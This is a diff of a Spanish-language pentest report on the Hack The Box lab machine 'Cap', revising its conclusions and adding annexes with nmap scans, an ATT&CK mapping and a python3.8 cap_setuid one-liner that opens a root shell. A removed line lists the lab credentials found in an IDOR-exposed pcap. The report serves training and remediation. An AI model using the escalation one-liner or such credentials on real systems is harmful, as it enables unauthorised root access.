-**Descripción.** El binario `/usr/bin/python3.8` tiene asignada la capability `cap_setuid=ep`, que le permite cambiar su propio UID a `0` sin pasar por `sudo` ni por ningún control adicional.
+Dos fallos de configuración, encadenados, permitieron el compromiso total: un panel sin
+autenticación que expuso credenciales reales mediante un IDOR, y una capability excesiva
+en un intérprete de Python que eliminó la barrera entre usuario sin privilegios y root.
+Ninguno de los dos pasos requirió explotar software vulnerable ni técnicas avanzadas.
 
-**Impacto.** Confirmado: un usuario local sin privilegios (`nathan`) ejecuta una línea de Python para asumir UID 0 y obtener una shell de `root`, logrando control total del sistema (lectura, modificación y persistencia sobre cualquier archivo o servicio).
+### 6.2 Aprendizajes del auditor
 
-**Evidencia.** [`loot/root.txt`](loot/root.txt).
+- Un identificador secuencial en una URL es, en la práctica, tan sensible como una
+  contraseña si detrás hay datos que no deberían ser públicos.
+- Las capabilities de Linux (`getcap -r /`) son un vector de escalada tan relevante como
+  el SUID o `sudo -l`, y conviene incluirlas de forma sistemática en la enumeración local.
+- La reutilización de contraseñas entre servicios (FTP y SSH) amplifica el impacto de una
+  única filtración.
 
-**Remediación.**
-- *Corrección:* retirar la capability con `setcap -r /usr/bin/python3.8` si no es un requisito funcional real; si lo fuera, sustituir por un binario dedicado y mínimo en lugar de un intérprete de propósito general.
-- *Mitigación:* mientras se corrige, auditar y restringir qué usuarios pueden ejecutar `/usr/bin/python3.8`.
-- *Detección:* alertar ante binarios con capabilities privilegiadas (`cap_setuid`, `cap_setgid`, `cap_sys_admin`, etc.) fuera de una lista aprobada, mediante revisiones periódicas de `getcap -r /`.
+---
 
-**Referencias.** CWE-250, [GTFOBins – python](https://gtfobins.github.io/gtfobins/python/#capabilities).
+## 7. Anexos
 
-## Plan de remediación priorizado
+### A. Salida completa de escaneos
 
-| Prioridad | Acción | Hallazgos | Esfuerzo | Reducción de riesgo | Plazo sugerido |
-| --- | --- | --- | --- | --- | --- |
-| P1 | Restringir o eliminar el acceso a capturas históricas del panel y purgar cualquier credencial expuesta en ellas | H-02 | Bajo | Crítico → Bajo | Inmediato (24-48 h) |
-| P2 | Retirar la capability `cap_setuid` de `/usr/bin/python3.8` (`setcap -r cap_setuid+ep /usr/bin/python3.8`) | H-03 | Bajo | Alto → Bajo | ≤ 7 días |
-| P3 | Exigir autenticación en todo el panel "Security Dashboard" | H-01 | Medio | Medio → Bajo | ≤ 30 días |
-| P4 | Forzar contraseñas distintas por servicio y evaluar rotación tras el incidente | H-02 | Bajo | Reduce impacto de reutilización de credenciales | ≤ 30 días |
+<details>
+<summary>nmap — todos los puertos</summary>
 
-## Lecciones aprendidas
+```text
+# Nmap 7.992 scan initiated Mon Oct 19 15:17:05 2026 as: nmap -p- --min-rate=5000 -T4 -Pn -n -oN loot/puertos.txt 10.129.85.254
+Nmap scan report for 10.129.85.254
+Host is up (0.16s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
 
-- Un identificador secuencial en una URL (`ID` de captura) es, en la práctica, tan sensible como una contraseña si detrás hay datos que no deberían ser públicos: conviene tratarlo con el mismo cuidado que cualquier control de acceso.
-- Las capabilities de Linux (`getcap -r /`) son un vector de escalada tan relevante como el SUID o `sudo -l`, y conviene incluirlas de forma sistemática en la enumeración local, incluso cuando los otros dos no arrojan resultados.
+# Nmap done at Mon Oct 19 15:17:19 2026 -- 1 IP address (1 host up) scanned in 13.78 seconds
+```
 
-## Herramientas utilizadas
+</details>
 
-| Herramienta | Uso                        |
-| ----------- | -------------------------- |
-| nmap        | Escaneo de puertos y servicios |
-| Navegador web | Exploración del panel "Security Dashboard" y descarga de capturas |
-| Wireshark / tshark | Análisis del archivo `.pcap` filtrando tráfico FTP |
-| ftp (cliente) | Acceso inicial y recuperación de `user.txt` |
-| ssh | Acceso interactivo como `nathan` |
-| getcap | Enumeración de capabilities de Linux |
-| python3.8 | Explotación de la capability `cap_setuid` para escalar a `root` |
+<details>
+<summary>nmap — escaneo de servicios</summary>
 
-## Evidencia
+```text
+# Nmap 7.992 scan initiated Mon Oct 19 15:30:56 2026 as: nmap -p21,22,80 -sCV -Pn -n -T4 -oN detallado.txt 10.129.85.254
+Nmap scan report for 10.129.85.254
+Host is up (0.17s latency).
 
-| Archivo | Contenido |
-| --- | --- |
-| [`loot/puertos.txt`](loot/puertos.txt) | Escaneo completo de puertos (`nmap -p-`) |
-| [`loot/detallado.txt`](loot/detallado.txt) | Escaneo dirigido con detección de versión (`nmap -sCV`) |
-| [`loot/ping.txt`](loot/ping.txt) | Verificación de conectividad (ICMP) |
-| [`loot/0.pcap`](loot/0.pcap) | Captura histórica descargada vía IDOR (`ID=0`), con la sesión FTP en texto plano |
-| [`loot/credentials_wireshark.txt`](loot/credentials_wireshark.txt) | Credenciales extraídas del pcap (`nathan:Buck3tH4TF0RM3!`) |
-| [`loot/user.txt`](loot/user.txt) | Flag de usuario |
-| [`loot/root.txt`](loot/root.txt) | Flag de root |
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    Gunicorn
+|_http-title: Security Dashboard
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-## Referencias
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Oct 19 15:31:10 2026 -- 1 IP address (1 host up) scanned in 14.15 seconds
+```
+
+</details>
+
+### B. Scripts y exploits
+
+<details><summary>Explotación de cap_setuid (python3.8)</summary>
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.execl("/bin/bash", "sh")'
+```
+
+</details>
+
+### C. Mapeo MITRE ATT&CK
+
+| Táctica | Técnica | ID |
+|---------|---------|----|
+| Credential Access | Unsecured Credentials | [T1552](https://attack.mitre.org/techniques/T1552/) |
+| Initial Access | Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078/) |
+| Privilege Escalation | Abuse Elevation Control Mechanism | [T1548](https://attack.mitre.org/techniques/T1548/) |
+
+### D. Referencias generales
 
 - [Página de la máquina en HTB](https://app.hackthebox.com/machines/Cap)
-- [HackTricks](https://book.hacktricks.xyz/)
-- [GTFOBins — python](https://gtfobins.github.io/gtfobins/python/#capabilities)
-- [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
-- [CWE-639 – Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
-- [CWE-250 – Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html)
+- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
+- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+- [Calculadora CVSS v3.1 — FIRST](https://www.first.org/cvss/calculator/3.1)
+- [MITRE ATT&CK](https://attack.mitre.org/)
